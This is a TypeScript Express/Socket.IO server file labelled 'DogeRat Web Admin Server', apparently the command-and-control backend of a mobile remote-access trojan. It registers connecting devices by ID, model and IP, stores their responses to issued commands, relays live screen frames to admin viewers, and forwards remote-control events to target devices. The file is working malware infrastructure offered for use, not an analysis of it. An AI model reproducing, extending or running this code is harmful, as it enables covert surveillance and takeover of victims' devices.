// DogeRat Web Admin Server - Main Entry Point
import express, { type Request, Response, NextFunction } from "express";
import { createServer } from "http";
import { Server as SocketIOServer } from "socket.io";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import rateLimit from "express-rate-limit";
import path from "path";
import { serveStatic, log } from "./vite";
import { setupSwagger } from "./swagger";

// Import database and models
import { initializeDatabase, Device } from "./models";
import logger from "./utils/logger";
import {
  initSocketBridge,
  registerDevice,
  unregisterDevice,
} from "./utils/socketBridge";

// Import routes
import authRoutes from "./routes/auth.routes";
import usersRoutes from "./routes/users.routes";
import devicesRoutes from "./routes/devices.routes";
import auditRoutes from "./routes/audit.routes";
import uploadRoutes from "./routes/upload.routes";

// Initialize Express app
const app = express();
const server = createServer(app);

// Helper: parse allowed CORS origins (comma-separated string or "*")
function getAllowedOrigins(): string | string[] {
  const raw = process.env.CORS_ORIGIN || "*";
  if (raw === "*" || raw.toLowerCase() === "true") return "*";
  return raw
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
}

const allowedOrigins = getAllowedOrigins();

// Initialize Socket.IO
const io = new SocketIOServer(server, {
  cors: {
    origin: allowedOrigins,
    methods: ["GET", "POST"],
  },
});

// Initialize Socket Bridge
initSocketBridge(io);

// Security middleware
app.use(
  helmet({
    contentSecurityPolicy: process.env.NODE_ENV === "production",
  }),
);

// CORS
app.use(
  cors({
    origin: allowedOrigins,
    credentials: true,
  }),
);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  message: "Too many requests from this IP, please try again later.",
});

app.use("/api/", limiter);

// Body parsing middleware
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// Logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

// API Routes
app.use("/api/auth", authRoutes);
app.use("/api/users", usersRoutes);
app.use("/api/devices", devicesRoutes);
app.use("/api/audit", auditRoutes);
app.use("/upload", uploadRoutes);

// Health check endpoint
/**
 * @swagger
 * /api/health:
 *   get:
 *     summary: Health check endpoint
 *     tags: [Health]
 *     responses:
 *       200:
 *         description: Server is healthy
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 status:
 *                   type: string
 *                   example: ok
 *                 timestamp:
 *                   type: string
 *                   format: date-time
 *                 environment:
 *                   type: string
 *                   example: development
 */
app.get("/api/health", (req, res) => {
  res.json({
    status: "ok",
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || "development",
  });
});

// Setup Swagger API Documentation
setupSwagger(app);

// Socket.IO - Device Connection Handling
io.on("connection", (socket) => {
  const deviceId =
    (socket.handshake.headers.model as string) || `device-${socket.id}`;
  const deviceModel = (socket.handshake.headers.version as string) || "unknown";
  const deviceIp =
    (socket.handshake.headers.ip as string) || socket.handshake.address;

  logger.info(`📱 Device connected: ${deviceId} (Socket: ${socket.id})`);

  // Register device in Socket Bridge
  registerDevice(deviceId, socket.id);

  // Create or update device record in database
  Device.findOne({ where: { device_id: deviceId } })
    .then(async (device) => {
      if (device) {
        await device.update({
          socket_id: socket.id,
          ip: deviceIp,
          last_seen_at: new Date(),
        });
      } else {
        await Device.create({
          socket_id: socket.id,
          device_id: deviceId,
          model: deviceModel,
          version: deviceModel,
          ip: deviceIp,
          user_agent: socket.handshake.headers["user-agent"],
          last_seen_at: new Date(),
        });

        logger.info(`✅ New device registered: ${deviceId}`);
      }
    })
    .catch((error) => {
      logger.error("Error creating/updating device:", error);
    });

  // Handle device disconnection
  socket.on("disconnect", () => {
    logger.info(`📱 Device disconnected: ${deviceId}`);
    unregisterDevice(deviceId);

    Device.findOne({ where: { device_id: deviceId } })
      .then((device) => {
        if (device) {
          device.update({ last_seen_at: new Date() });
        }
      })
      .catch((error) => {
        logger.error("Error updating device disconnect:", error);
      });
  });

  // Handle incoming messages from device
  socket.on("message", (data) => {
    logger.info(`📨 Message from ${deviceId}:`, data);
    io.emit("device-message", {
      deviceId,
      message: data,
      timestamp: new Date().toISOString(),
    });
  });

  // Handle command responses from device
  socket.on("command-response", async (data) => {
    logger.info(`✅ Command response from ${deviceId}:`, data);

    const { commandId, status, response, error } = data;

    if (commandId) {
      const { Command, CommandStatus } = await import("./models");
      const command = await Command.findByPk(commandId);

      if (command) {
        await command.update({
          status: status || CommandStatus.OK,
          response: response || null,
          error_message: error || null,
          executed_at: new Date(),
        });
      }
    }
  });

  // Screen streaming events
  socket.on("screen-frame", (data) => {
    const { frame, timestamp } = data;

    // Broadcast frame to admin clients watching this device
    io.to(`admin-watching-${deviceId}`).emit("device-screen-frame", {
      deviceId,
      frame,
      timestamp: timestamp || Date.now(),
    });
  });

  socket.on("start-screen-stream", () => {
    logger.info(`📺 Screen stream started for device: ${deviceId}`);
    socket.emit("stream-started", { status: "ok" });
  });

  socket.on("stop-screen-stream", () => {
    logger.info(`📺 Screen stream stopped for device: ${deviceId}`);
    socket.emit("stream-stopped", { status: "ok" });
  });

  // Remote control events
  socket.on("remote-control-event", (data) => {
    const { targetDeviceId, eventType, eventData } = data;

    logger.info(
      `🎮 Remote control event: ${eventType} for device: ${targetDeviceId}`,
    );

    // Relay to target device
    io.to(targetDeviceId).emit("control-event", {
      type: eventType,
      data: eventData,
      timestamp: Date.now(),
    });
  });

  // Heartbeat to keep connection alive
  const heartbeatInterval = setInterval(() => {
    socket.emit("ping");
  }, 30000);

  socket.on("pong", () => {
    Device.findOne({ where: { device_id: deviceId } })
      .then((device) => {
        if (device) {
          device.update({ last_seen_at: new Date() });
        }
      })
      .catch((error) => {
        logger.error("Error updating heartbeat:", error);
      });
  });

  socket.on("disconnect", () => {
    clearInterval(heartbeatInterval);
  });
});

// Error handling middleware
app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";
  logger.error("Unhandled error:", err);
  res.status(status).json({ message });
});

// Initialize database and start server
(async () => {
  try {
    // Initialize database
    await initializeDatabase();

    // Serve static client assets (Angular build output)
    // If the client hasn't been built yet, this will just log a warning.
    serveStatic(app);

    // Start server
    const port = parseInt(process.env.PORT || "5000", 10);
    server.listen(
      {
        port,
        host: "0.0.0.0",
        reusePort: true,
      },
      () => {
        log(`🚀 DogeRat Web Admin Server running on port ${port}`);
        log(`📡 Socket.IO enabled for real-time communication`);
        log(`🌍 Environment: ${process.env.NODE_ENV || "development"}`);
        log(`💾 Database: ${process.env.DB_TYPE || "postgres"}`);
      },
    );
  } catch (error) {
    logger.error("Failed to start server:", error);
    process.exit(1);
  }
})();

// Graceful shutdown
process.on("SIGTERM", () => {
  logger.info("SIGTERM received, shutting down gracefully...");
  server.close(() => {
    logger.info("Server closed");
    process.exit(0);
  });
});

export { app, server, io };
